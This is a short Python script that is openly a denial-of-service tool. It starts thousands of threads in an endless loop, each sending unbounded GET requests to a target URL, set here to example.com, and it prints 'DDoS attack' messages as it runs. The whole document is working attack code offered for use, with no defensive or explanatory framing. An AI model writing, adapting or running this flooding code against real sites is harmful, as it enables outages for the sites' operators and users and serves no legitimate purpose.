import requests
import threading

target_website = "https://example.com"

def send_ddos_request():
    while True:
        try:
            response = requests.get(target_website)
            print(f"DDoS attack on {target_website}. Response status code: {response.status_code}")
        except Exception as e:
            print(f"Error during DDoS attack: {e}")

def ddos_attack():
    while True:
        for _ in range(5000):
            t = threading.Thread(target=send_ddos_request)
            t.start()
ddos_attack()
